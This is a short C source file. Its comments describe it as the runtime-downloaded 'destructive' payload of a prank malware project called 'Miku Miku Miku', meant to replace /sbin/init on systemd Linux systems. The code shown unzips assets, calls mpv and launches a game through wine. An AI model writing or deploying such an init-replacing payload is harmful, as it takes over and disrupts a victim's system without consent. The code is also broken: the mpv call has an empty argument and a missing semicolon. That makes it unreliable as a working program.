#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// The destructive part of Miku Miku Miku, this gets downloaded on runtime.
// This replaces /sbin/init on systemd-based Linux distros.

int main()
{
    // Just gotta unzip the assets hold on
    system(" cd /miku && unzip Assets.zip");

    // HATSUNE MIKU!!!!!!!!!!!!!!!!!
    system("mpv ")

    // Let's play some Aurascope! Second to last step of the payload.
    system("cd Aurascope && xinit /usr/bin/wine Aurascope.exe");

    return 0;
}
